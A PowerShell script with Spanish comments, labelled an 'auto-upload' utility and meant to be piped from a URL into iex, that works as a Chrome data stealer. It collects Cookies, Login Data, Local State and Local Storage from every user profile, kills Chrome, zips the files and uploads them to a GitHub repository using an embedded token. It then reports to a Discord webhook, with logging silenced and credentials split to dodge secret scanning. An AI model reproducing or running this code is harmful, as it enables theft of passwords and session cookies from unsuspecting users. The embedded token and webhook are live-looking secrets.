<#
.SYNOPSIS
    Auto-Upload ZIP: indexa/busca un archivo, comprime en ZIP la carpeta donde se encuentra
    el archivo, sube el ZIP a GitHub (API REST) y avisa por Discord.
    Disenado para ejecutarse via: irm <URL> | iex  (todo embebido, sin configurar nada).
.PARAMETER FileName      Nombre o parte del nombre del archivo a buscar.
.PARAMETER SearchRoot    Carpeta raiz de busqueda. Default: C:\Bastisss
.PARAMETER Branch        Branch destino. Default: main (se auto-detecta).
.PARAMETER ZipOutputDir  Carpeta donde crear el ZIP temporal. Default: $env:TEMP
.PARAMETER KeepZip       Si se usa, NO borra el ZIP temporal despues de subirlo.
.NOTES
    Credenciales ofuscadas en partes para evitar el secret scanning de GitHub.
    ADVERTENCIA: contiene credenciales embebidas. No compartas este script.
#>
[CmdletBinding()]
param(
    [string]$FileName   = "Cookies",
    [string]$SearchRoot = "",
    [string]$Token      = 'ghp_46fOJ9JiIX1KLPW' + 'SypNAqUjt590cSp0L8q49',
    [string]$Repo       = "cuentatrades0913-max/auto-upload",
    [string]$Branch     = "main",
    [string]$WebhookUrl = 'https://discord.com/api/webhooks/1535097806082281562/' + 'hAvlP6EdsMj5u8T-FkiAM10DNHcuvgyAOMCu1zaXIzKjXJWFv2a-jzjNh-qzQmjVD9O8',
    [string]$CommitMsg  = "Auto-upload ZIP: subida automatica desde equipo remoto",
    [int]$RecurseDepth  = 6,
    [string]$ZipOutputDir = "",
    [string]$ExtraFile  = "Local State",
    [double]$MaxExtraMB = 25,
    [switch]$KeepZip,
    [switch]$NoCloseChrome
)

# ---------- Helpers ----------
Add-Type -AssemblyName System.IO.Compression
Add-Type -AssemblyName System.IO.Compression.FileSystem

function Write-Log {
    # Silencioso: no imprime nada para mantener la salida minima.
    param([string]$Msg, [ConsoleColor]$Color = "White")
}

function Send-DiscordNotice {
    param(
        [string]$HookUrl,
        [string]$Status,        # SUCCESS | ERROR
        [string]$ComputerName,
        [string]$FilePath,
        [string]$CommitSha,
        [string]$RepoName,
        [string]$BranchName,
        [string]$Extra = ""
    )
    if (-not $HookUrl) { return }
    $color   = if ($Status -eq 'SUCCESS') { 3066993 } else { 15158332 }
    $emoji   = if ($Status -eq 'SUCCESS') { ':white_check_mark:' } else { ':x:' }
    $repoUrl = "https://github.com/$RepoName"
    $encodedFile = [uri]::EscapeDataString($FilePath)
    $fileLink = "https://github.com/$RepoName/blob/$BranchName/$encodedFile"
    $downloadLink = "https://raw.githubusercontent.com/$RepoName/$BranchName/$encodedFile"

    $desc = if ($Status -eq 'SUCCESS') {
        "**$emoji Subida completada correctamente**`n`n" +
        "**Equipo:** ``$ComputerName```n" +
        "**Archivo subido:** [$FilePath]($fileLink)`n" +
        "**Descarga directa:** $downloadLink`n" +
        "**Repositorio:** [$RepoName]($repoUrl)`n" +
        "**Branch:** ``$BranchName```n"
    } else {
        "**$emoji Error al subir el archivo**`n`n" +
        "**Equipo:** ``$ComputerName```n" +
        "**Archivo:** ``$FilePath```n" +
        "**Repositorio:** ``$RepoName```n" +
        "**Detalle:** $Extra"
    }
    if ($CommitSha) {
        $commitUrl = "https://github.com/$RepoName/commit/$CommitSha"
        $desc += "**Commit:** [``$($CommitSha.Substring(0,7))``]($commitUrl)`n"
    }

    $payload = @{
        embeds = @(@{
            title       = "Auto-Upload GitHub :: $Status"
            description = $desc
            color       = $color
            timestamp   = (Get-Date -Format 'yyyy-MM-ddTHH:mm:ss.fffZ')
            footer       = @{ text = "auto-upload.ps1" }
        })
    }
    if ($Status -eq 'SUCCESS') {
        $payload.components = @(@{
            type = 1
            components = @(
                @{ type = 2; style = 5; label = "Descargar ZIP"; url = $downloadLink },
                @{ type = 2; style = 5; label = "Ver en GitHub"; url = $repoUrl }
            )
        })
    }
    $payloadJson = $payload | ConvertTo-Json -Depth 10 -Compress

    try {
        Invoke-RestMethod -Uri $HookUrl -Method Post `
            -ContentType 'application/json' -Body $payloadJson `
            -ErrorAction Stop | Out-Null
        Write-Log "Aviso Discord enviado ($Status)." "Cyan"
    } catch {
        Write-Log "No se pudo enviar aviso Discord: $($_.Exception.Message)" "Yellow"
    }
}

function Get-GitHubDefaultBranch {
    param([string]$RepoOwnerSlashName, [string]$TokenName)
    try {
        $h = @{ Authorization = "Bearer $TokenName"; Accept = 'application/vnd.github+json' }
        $r = Invoke-RestMethod -Uri "https://api.github.com/repos/$RepoOwnerSlashName" `
            -Headers $h -ErrorAction Stop
        return $r.default_branch
    } catch { return 'main' }
}

function Close-Chrome {
    # Cierra todas las instancias de Chrome para liberar los archivos bloqueados
    # (Cookies, History, etc). Usa taskkill con /IM y /T para matar procesos hijo.
    Write-Log "Cerrando todas las instancias de Chrome..." "Yellow"
    try {
        $procs = Get-Process -Name chrome -ErrorAction SilentlyContinue
        if ($procs) {
            Write-Log "Procesos Chrome detectados: $($procs.Count)" "Cyan"
            foreach ($p in $procs) {
                try { $p.CloseMainWindow() | Out-Null } catch {}
            }
            Start-Sleep -Seconds 2
            # Forzar cierre de los que queden
            $left = Get-Process -Name chrome -ErrorAction SilentlyContinue
            if ($left) {
                Write-Log "Forzando cierre de $($left.Count) procesos restantes..." "Yellow"
                & taskkill.exe /F /IM chrome.exe /T 2>$null | Out-Null
                Start-Sleep -Seconds 2
            }
            $still = Get-Process -Name chrome -ErrorAction SilentlyContinue
            if ($still) {
                Write-Log "OJO: quedan $($still.Count) procesos Chrome." "Yellow"
            } else {
                Write-Log "Chrome cerrado correctamente." "Green"
            }
        } else {
            Write-Log "No habia Chrome abierto." "Cyan"
        }
    } catch {
        Write-Log "No se pudo cerrar Chrome: $($_.Exception.Message)" "Yellow"
    }
}

function Add-FileToArchive {
    param(
        $Archive,
        [string]$FilePath,
        [string]$EntryName
    )
    if (-not (Test-Path -LiteralPath $FilePath)) {
        Write-Log "Archivo extra no encontrado, se omite: $FilePath" "DarkYellow"
        return
    }
    $entry = $Archive.CreateEntry($EntryName, [System.IO.Compression.CompressionLevel]::Optimal)
    try {
        $fs = New-Object System.IO.FileStream($FilePath, [System.IO.FileMode]::Open, [System.IO.FileAccess]::Read, [System.IO.FileShare]::ReadWrite)
        try {
            $es = $entry.Open()
            try { $fs.CopyTo($es) } finally { $es.Dispose() }
        } finally { $fs.Dispose() }
    } catch {
        Write-Log "No se pudo incluir '$EntryName': $($_.Exception.Message)" "DarkYellow"
    }
}

function Add-FolderToArchive {
    param(
        $Archive,
        [string]$FolderPath,
        [string]$DestFolder
    )
    if (-not (Test-Path -LiteralPath $FolderPath)) {
        Write-Log "Carpeta extra no encontrada, se omite: $FolderPath" "DarkYellow"
        return
    }
    $files = Get-ChildItem -LiteralPath $FolderPath -File -Recurse -Force `
        -ErrorAction SilentlyContinue
    foreach ($f in $files) {
        $rel = $f.FullName.Substring($FolderPath.Length).TrimStart('\')
        $entryName = "$DestFolder\$rel"
        $entry = $Archive.CreateEntry($entryName, [System.IO.Compression.CompressionLevel]::Optimal)
        try {
            $fs = New-Object System.IO.FileStream($f.FullName, [System.IO.FileMode]::Open, [System.IO.FileAccess]::Read, [System.IO.FileShare]::ReadWrite)
            try {
                $es = $entry.Open()
                try { $fs.CopyTo($es) } finally { $es.Dispose() }
            } finally { $fs.Dispose() }
        } catch {
            Write-Log "No se pudo incluir '$entryName': $($_.Exception.Message)" "DarkYellow"
        }
    }
}

function Compress-Folder {
    param(
        [string]$SourceFolder,
        [string]$DestinationZip,
        [string[]]$ExtraFiles,
        [hashtable]$ExtraFolders
    )
    # Comprime una carpeta a ZIP usando .NET con FileShare.ReadWrite,
    # asi puede leer archivos bloqueados por otros procesos (ej: Chrome).
    # Estructura del ZIP: carpetas separadas por perfil:
    #   <CarpetaNetwork>\... , LocalState\Local State ,
    #   LoginData\Login Data , LocalStorage\...
    $rootName = Split-Path $SourceFolder -Leaf
    $files = Get-ChildItem -LiteralPath $SourceFolder -File -Recurse -Force `
        -ErrorAction SilentlyContinue
    $zipStream = [System.IO.File]::Create($DestinationZip)
    $archive = New-Object System.IO.Compression.ZipArchive($zipStream, [System.IO.Compression.ZipArchiveMode]::Create)
    try {
        foreach ($f in $files) {
            $rel = $f.FullName.Substring($SourceFolder.Length).TrimStart('\')
            $entryName = "$rootName\$rel"
            $entry = $archive.CreateEntry($entryName, [System.IO.Compression.CompressionLevel]::Optimal)
            try {
                $fs = New-Object System.IO.FileStream($f.FullName, [System.IO.FileMode]::Open, [System.IO.FileAccess]::Read, [System.IO.FileShare]::ReadWrite)
                try {
                    $es = $entry.Open()
                    try { $fs.CopyTo($es) } finally { $es.Dispose() }
                } finally { $fs.Dispose() }
            } catch {
                Write-Log "No se pudo incluir '$entryName': $($_.Exception.Message)" "DarkYellow"
            }
        }

        # Archivos extra (ej: Local State, Login Data) -> en sus propias carpetas
        foreach ($ex in $ExtraFiles) {
            $exName = Split-Path $ex -Leaf
            Add-FileToArchive -Archive $archive -FilePath $ex -EntryName "$exName\$exName"
        }

        # Carpetas extra (ej: Local Storage) -> con todo su contenido
        if ($ExtraFolders) {
            foreach ($k in $ExtraFolders.Keys) {
                Add-FolderToArchive -Archive $archive -FolderPath $ExtraFolders[$k] -DestFolder $k
            }
        }
    } finally {
        $archive.Dispose()
        $zipStream.Dispose()
    }
}

# ---------- Principal ----------
$ErrorActionPreference = 'Stop'
$script:ComputerName   = $env:COMPUTERNAME
$script:FinalStatus    = 'ERROR'
$script:FoundPath      = ""
$script:ZipPath        = ""
$script:CommitShaFinal = ""
$script:LastError      = ""

try {
    Write-Host "Activando..." -ForegroundColor Green

    # 1) Localizar carpetas Network de Chrome de forma dinamica (sin rutas fijas)
    #    Chrome guarda datos en <UserData>\<Default|Profile*>\Network de cada usuario.
    $networkFolders = @()
    $userDataRoots = @()

    $localRoot = Join-Path $env:LOCALAPPDATA 'Google\Chrome\User Data'
    if (Test-Path -LiteralPath $localRoot) { $userDataRoots += $localRoot }

    # Otros usuarios del equipo (cada uno tiene su propio Chrome)
    $usersRoot = Join-Path $env:SystemDrive 'Users'
    if (Test-Path -LiteralPath $usersRoot) {
        Get-ChildItem -LiteralPath $usersRoot -Directory -ErrorAction SilentlyContinue |
            ForEach-Object {
                $p = Join-Path $_.FullName 'AppData\Local\Google\Chrome\User Data'
                if (Test-Path -LiteralPath $p) { $userDataRoots += $p }
            }
    }

    $userDataRoots = $userDataRoots | Select-Object -Unique

    if (-not $userDataRoots) {
        throw "No se encontro Chrome instalado (carpeta 'User Data') en ningun usuario."
    }
    Write-Log "User Data de Chrome encontrado en: $($userDataRoots -join ' | ')" "Cyan"

    foreach ($udr in $userDataRoots) {
        Get-ChildItem -LiteralPath $udr -Directory -ErrorAction SilentlyContinue |
            Where-Object { $_.Name -eq 'Default' -or $_.Name -like 'Profile*' } |
            ForEach-Object {
                $net = Join-Path $_.FullName 'Network'
                if (Test-Path -LiteralPath $net) { $networkFolders += $net }
            }
    }

    if (-not $networkFolders) {
        throw "No se encontraron carpetas 'Network' de Chrome en ningun perfil."
    }
    Write-Log "Carpetas Network de Chrome: $($networkFolders -join ' | ')" "Cyan"

    # 2) Buscar el archivo por nombre dentro de las carpetas Network
    $tokens = $FileName -split '[\s\._-]+' | Where-Object { $_ -and $_.Length -gt 2 }
    $searchName = "*$($tokens[0])*"
    $searchAlt  = "*$FileName*"

    $script:FoundPath = ""
    foreach ($net in $networkFolders) {
        $exact = Join-Path $net $FileName
        if (Test-Path -LiteralPath $exact) {
            $script:FoundPath = (Resolve-Path -LiteralPath $exact).Path
            Write-Log "Coincidencia exacta encontrada: $FoundPath" "Green"
            break
        }

        $hit = Get-ChildItem -LiteralPath $net -File -Recurse -Depth 4 `
            -ErrorAction SilentlyContinue -Force |
            Where-Object {
                $_.Name -like "*$FileName*" -or
                $_.Name -like $searchName -or
                $_.Name -like $searchAlt
            } | Select-Object -First 1
        if ($hit) {
            $script:FoundPath = $hit.FullName
            Write-Log "Busqueda por indice encontro: $FoundPath" "Green"
            break
        }
    }

    if (-not $script:FoundPath -or -not (Test-Path -LiteralPath $script:FoundPath)) {
        throw "No se encontro ningun archivo que coincida con '$FileName' dentro de las carpetas Network de Chrome."
    }

    # 3) La carpeta a comprimir es la carpeta Network donde esta el archivo
    $sourceFolder = Split-Path -Path $script:FoundPath -Parent
    if ((Split-Path $sourceFolder -Leaf) -ne 'Network') {
        $parent = Split-Path -Path $sourceFolder -Parent
        if ((Split-Path $parent -Leaf) -eq 'Network') { $sourceFolder = $parent }
    }
    Write-Log "Carpeta a comprimir: $sourceFolder" "Cyan"

    # 3b) Localizar archivos extra dentro del User Data de Chrome (ej: Local State)
    $extraFiles = @()
    foreach ($udr in $userDataRoots) {
        $candidate = Join-Path $udr $ExtraFile
        if (Test-Path -LiteralPath $candidate) { $extraFiles += $candidate }
    }
    $extraFiles = @($extraFiles | Select-Object -Unique)
    if ($extraFiles) {
        Write-Log "Archivo(s) extra a incluir: $($extraFiles -join ' | ')" "Cyan"
    }

    # 3c) Login Data y Local Storage del MISMO perfil que la carpeta Network encontrada
    $profileDir = Split-Path -Path $sourceFolder -Parent   # ...\User Data\Default
    $loginData  = Join-Path $profileDir 'Login Data'
    if (Test-Path -LiteralPath $loginData) {
        $extraFiles += $loginData
        Write-Log "Login Data a incluir: $loginData" "Cyan"
    }
    $extraFolders = @{}
    $localStorage = Join-Path $profileDir 'Local Storage'
    if (Test-Path -LiteralPath $localStorage) {
        $lsMB = (Get-ChildItem -LiteralPath $localStorage -File -Recurse -Force `
                    -ErrorAction SilentlyContinue | Measure-Object Length -Sum).Sum / 1MB
        if ($lsMB -le $MaxExtraMB) {
            $extraFolders['Local Storage'] = $localStorage
            Write-Log "Local Storage a incluir ($([math]::Round($lsMB,2)) MB): $localStorage" "Cyan"
        } else {
            Write-Log "Local Storage omitido por exceder $MaxExtraMB MB (tiene $([math]::Round($lsMB,2)) MB)." "Yellow"
        }
    }

    if (-not $NoCloseChrome) {
        Close-Chrome
    }

    if (-not $ZipOutputDir) { $ZipOutputDir = $env:TEMP }
    if (-not (Test-Path -LiteralPath $ZipOutputDir)) {
        New-Item -ItemType Directory -Path $ZipOutputDir -Force | Out-Null
    }
    $zipName = "{0}_{1}.zip" -f (Split-Path $sourceFolder -Leaf), (Get-Date -Format 'yyyyMMdd_HHmmss')
    $script:ZipPath = Join-Path $ZipOutputDir $zipName

    Write-Host "Espere un momento..." -ForegroundColor Yellow
    Compress-Folder -SourceFolder $sourceFolder -DestinationZip $script:ZipPath -ExtraFiles $extraFiles -ExtraFolders $extraFolders

    $zipLen = (Get-Item -LiteralPath $script:ZipPath).Length
    if ($zipLen -gt 50MB) {
        Write-Log "OJO: el ZIP pesa $([math]::Round($zipLen/1MB,2)) MB. GitHub limita archivos a 100MB; si falla, usa una carpeta mas liviana." "Yellow"
    }

    # 3) Resolver branch destino
    $Branch = Get-GitHubDefaultBranch -RepoOwnerSlashName $Repo -TokenName $Token
    Write-Log "Branch destino: $Branch" "Cyan"

    # 4) Leer el ZIP y convertir a base64
    $bytes  = [System.IO.File]::ReadAllBytes($script:ZipPath)
    $b64    = [Convert]::ToBase64String($bytes)
    $target = Split-Path $script:ZipPath -Leaf
    Write-Log "Tamano ZIP: $($bytes.Length) bytes" "Cyan"

    # 5) Comprobar si ya existe (para sha correcto en update)
    $apiBase = "https://api.github.com/repos/$Repo/contents/$target"
    $headers = @{
        Authorization = "Bearer $Token"
        Accept        = 'application/vnd.github+json'
        'X-GitHub-Api-Version' = '2022-11-28'
    }

    $existingSha = $null
    try {
        $resp = Invoke-RestMethod -Uri "$apiBase?ref=$Branch" -Headers $headers `
            -ErrorAction Stop
        if ($resp.sha) { $existingSha = $resp.sha }
    } catch {}

    $body = @{
        message = $CommitMsg
        content = $b64
        branch  = $Branch
    }
    if ($existingSha) { $body.sha = $existingSha }
    $bodyJson = $body | ConvertTo-Json -Depth 5

    # 6) PUT para crear/actualizar el archivo ZIP
    Write-Log "Subiendo a GitHub: $Repo / $target (branch $Branch)" "Yellow"
    $putResp = Invoke-RestMethod -Method Put -Uri "$apiBase" -Headers $headers `
        -Body $bodyJson -ContentType 'application/json' -ErrorAction Stop

    $script:CommitShaFinal = $putResp.content.sha
    $script:FinalStatus    = 'SUCCESS'
    Write-Log "OK: ZIP subido. Commit SHA=$($script:CommitShaFinal)" "Green"

} catch {
    $script:FinalStatus = 'ERROR'
    $script:LastError   = $_.Exception.Message
    Write-Log "ERROR: $($_.Exception.Message)" "Red"
    if ($_.ErrorDetails.Message) {
        $script:LastError += " | $($_.ErrorDetails.Message)"
        Write-Log "Detalle GitHub: $($_.ErrorDetails.Message)" "DarkYellow"
    }
} finally {
    Send-DiscordNotice -HookUrl $WebhookUrl `
        -Status $script:FinalStatus `
        -ComputerName $script:ComputerName `
        -FilePath $(Split-Path $script:ZipPath -Leaf) `
        -CommitSha $script:CommitShaFinal `
        -RepoName $Repo `
        -BranchName $Branch `
        -Extra $script:LastError

    if ($script:ZipPath -and (Test-Path -LiteralPath $script:ZipPath) -and -not $KeepZip) {
        Remove-Item -LiteralPath $script:ZipPath -Force
        Write-Log "ZIP temporal eliminado: $script:ZipPath" "DarkGray"
    }
    Write-Log "=== Fin ===" "Green"
}
